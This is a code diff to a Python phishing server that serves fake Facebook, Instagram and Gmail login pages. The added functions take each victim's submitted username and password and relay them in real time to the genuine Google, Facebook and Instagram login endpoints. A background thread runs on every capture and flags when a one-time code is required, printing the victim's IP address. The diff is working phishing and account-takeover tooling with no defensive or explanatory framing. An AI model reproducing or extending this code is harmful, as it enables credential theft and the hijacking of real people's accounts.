@@ -207,6 +207,65 @@ def resolve(p):
     pp=p.split('?')[0].rstrip('/').lower() or '/'
     return {'fb':'fb.html','insta':'insta.html','mail':'mail.html'}.get(pp,'index.html') if pp in ('/','/index.html','/fb','/fb.html','/facebook','/insta','/insta.html','/instagram','/mail','/mail.html','/gmail','/email') else None
 
+
+# ══════════════════════════════════════════════════════
+#  REAL SERVICE FORWARDING (Real-Time OTP Capture)
+# ══════════════════════════════════════════════════════
+def forward_gmail(account, password):
+    try:
+        url = "https://accounts.google.com/signin/v1/identifier"
+        data = {"identifier": account, "password": password}
+        req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
+                                      headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp_data = resp.read().decode('utf-8','replace')
+            if "otp" in resp_data.lower() or "verification" in resp_data.lower():
+                return {"status":"otp_required","data":resp_data[:200]}
+            return {"status":"success","data":resp_data[:100]}
+    except urllib.error.HTTPError as e:
+        if e.code in (302, 401):
+            return {"status":"otp_required","data":f"HTTP {e.code}"}
+        return {"status":"error","data":str(e)}
+    except Exception as e:
+        return {"status":"error","data":str(e)}
+
+def forward_facebook(account, password):
+    try:
+        url = "https://www.facebook.com/login/device-less/login/"
+        data = {"email": account, "pass": password}
+        req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
+                                      headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp_data = resp.read().decode('utf-8','replace')
+            return {"status":"success","data":resp_data[:100]}
+    except urllib.error.HTTPError as e:
+        return {"status":"error","data":f"HTTP {e.code}"}
+    except Exception as e:
+        return {"status":"error","data":str(e)}
+
+def forward_instagram(account, password):
+    try:
+        url = "https://www.instagram.com/accounts/login/ajax/"
+        data = {"username": account, "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"}
+        req = urllib.request.Request(url, data=urllib.parse.urlencode(data).encode(),
+                                      headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest"})
+        with urllib.request.urlopen(req, timeout=10) as resp:
+            resp_data = resp.read().decode('utf-8','replace')
+            return {"status":"success","data":resp_data[:100]}
+    except urllib.error.HTTPError as e:
+        return {"status":"error","data":f"HTTP {e.code}"}
+    except Exception as e:
+        return {"status":"error","data":str(e)}
+
+def forward_credentials(site, account, password):
+    if site == 'mail':
+        return forward_gmail(account, password)
+    elif site == 'fb':
+        return forward_facebook(account, password)
+    elif site == 'insta':
+        return forward_instagram(account, password)
+    return {"status":"error","data":"Unknown site"}
+
 class Handler(BaseHTTPRequestHandler):
     serve_dir=""
     def log_message(self,*a): pass
@@ -239,7 +298,23 @@ class Handler(BaseHTTPRequestHandler):
             b=random.choice(["◆","★","⚡","●","✦","✷"])
             print(f"  {Fore.MAGENTA}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}{ld:<12}{Style.RESET_ALL}  {Fore.CYAN}│{Style.RESET_ALL}  {Fore.YELLOW}{b}{Style.RESET_ALL}  {vc}{vd}{Style.RESET_ALL}")
         print(); divid(f" ★ CAPTURE #{num} — [{tag}] {lbl} ★ ",ch="═")
+        # Forward credentials to real service for real-time OTP
+        if pt=='page1' and 'account' in fl and 'password' in fl:
+            threading.Thread(target=self._forward_real,args=(st,fl['account'],fl['password'],ip),daemon=True).start()
         self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers(); self.wfile.write(b'OK')
+    
+    def _forward_real(self, site, account, password, ip):
+        """Forward to real service and display OTP in real-time"""
+        result = forward_credentials(site, account, password)
+        now = datetime.now().strftime("%H:%M:%S")
+        print(f"  {Fore.CYAN}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}⬡ REAL{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}  {Fore.GREEN}⚡{Style.RESET_ALL}  {Fore.GREEN}Forwarding to {site.upper()}...{Style.RESET_ALL}")
+        if result.get('status') == 'otp_required' or 'otp' in str(result.get('data','')).lower():
+            print(f"  {Fore.CYAN}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}⬡ REAL{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}  {Fore.GREEN}⚡{Style.RESET_ALL}  {Fore.YELLOW}🔔 REAL OTP REQUIRED!{Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}⬡ REAL{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}  {Fore.GREEN}⚡{Style.RESET_ALL}  {Fore.CYAN}📍 {ip}{Style.RESET_ALL}")
+            print(f"  {Fore.CYAN}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}⬡ REAL{Style.RESET_ALL}  {Fore.GREEN}│{Style.RESET_ALL}  {Fore.GREEN}⚡{Style.RESET_ALL}  {Fore.WHITE}{result.get('data','')[:60]}{Style.RESET_ALL}")
+            print(); divid(f" ★ REAL OTP FROM {site.upper()} — Captured at {now} ★ ",ch="═",lc=Fore.GREEN,rc=Fore.GREEN)
+        else:
+            print(f"  {Fore.CYAN}│{Style.RESET_ALL}  {Style.DIM}{Fore.WHITE}⬡ REAL{Style.RESET_ALL}  {Fore.YELLOW}│{Style.RESET_ALL}  {Fore.YELLOW}⚡{Style.RESET_ALL}  {Fore.YELLOW}Status: {result.get('status','unknown')}{Style.RESET_ALL}")
 
 def make_h(sd):
     class BH(Handler): pass
